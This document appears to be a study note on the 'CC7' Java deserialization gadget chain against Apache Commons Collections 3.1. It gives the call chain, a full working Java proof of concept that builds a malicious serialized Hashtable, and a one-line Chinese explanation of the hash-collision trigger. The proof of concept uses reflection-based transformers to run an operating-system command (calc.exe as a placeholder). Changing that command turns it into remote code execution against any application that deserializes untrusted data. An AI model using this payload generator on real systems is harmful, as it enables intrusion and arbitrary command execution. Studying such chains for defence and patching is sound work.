# cc7

## Gadget chain&Requires

```
Gadget chain:
    java.util.Hashtable.readObject
     java.util.Hashtable.reconstitutionPut
            org.apache.commons.collections.map.AbstractMapDecorator.equals
                java.util.AbstractMap.equals
                    org.apache.commons.collections.map.LazyMap.get
                        org.apache.commons.collections.functors.ChainedTransformer.transform
                            org.apache.commons.collections.functors.InvokerTransformer.transform
                                 java.lang.reflect.Method.invoke
    							java.lang.Runtime.exec
    
Require:
	commons-collections:commons-collections:3.1
```

## poc

```java
package com.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static Object getObject() throws NoSuchFieldException, IllegalAccessException {

        Transformer[] fakeTransformers = new Transformer[] {};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);


        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        lazyMap2.remove("yy");
        return hashtable;
    }
}

```

## analysis

在Hashtable类中，readObject中插入元素时，触发hash碰撞，就会调用LazyMap的equal方法，由于LazyMap没有定义这个方法，会调用他的父类`AbstractMapDecorator.equals()`方法。

详细分析见笔记。
